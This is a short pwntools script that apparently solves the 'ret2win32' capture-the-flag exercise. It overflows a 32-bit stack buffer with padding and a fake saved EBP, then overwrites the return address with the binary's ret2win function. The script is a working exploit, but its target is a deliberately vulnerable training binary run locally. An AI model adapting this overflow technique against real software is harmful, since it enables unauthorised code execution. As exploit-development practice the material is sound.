#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.bits = 32
gs = '''
continue
'''

elf = context.binary = ELF('./ret2win32')

def start():
    if args.GDB:
        #return gdb.attach(process(elf.path), gs)
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#========= exploit here ===================

junk = b'A'*40
ebp = b'B'*4
ret2win = p32(elf.sym.ret2win)

payload = junk
payload += ebp
payload += ret2win

r.sendlineafter('>', payload)

#========= interactive ====================
r.interactive()
